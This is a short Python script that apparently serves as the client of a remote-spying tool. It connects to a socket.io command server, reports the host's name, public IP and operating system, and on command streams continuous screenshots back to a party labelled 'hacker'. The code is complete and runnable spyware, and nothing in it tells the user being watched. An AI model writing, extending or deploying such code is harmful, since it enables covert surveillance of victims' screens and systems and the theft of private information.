import socketio
from requests import get
import socket
import platform
import pyautogui
import numpy as np

sio = socketio.Client()

isRemotting = False

@sio.event
def connect():
  print("I'm connected!")

@sio.on('info')
def myInfo():
  ip = get("https://api.ipify.org").text

  sio.emit('my info', {
    'name': socket.gethostname(),
    'ip': ip,
    'os': "mac" if platform.system() == "Darwin" else platform.system()
  })

@sio.on('stop remote')
def remoteStop():
  global isRemotting
  isRemotting = False

@sio.on('remote start')
def remoteStart(data):
  global isRemotting
  isRemotting = True
  while isRemotting:
    screen = pyautogui.screenshot()
    src = np.array(screen)

    sio.emit('stream monitor', {'src': src, 'hacker': data['hacker']})

if __name__ == '__main__':
  sio.connect('http://localhost:8000')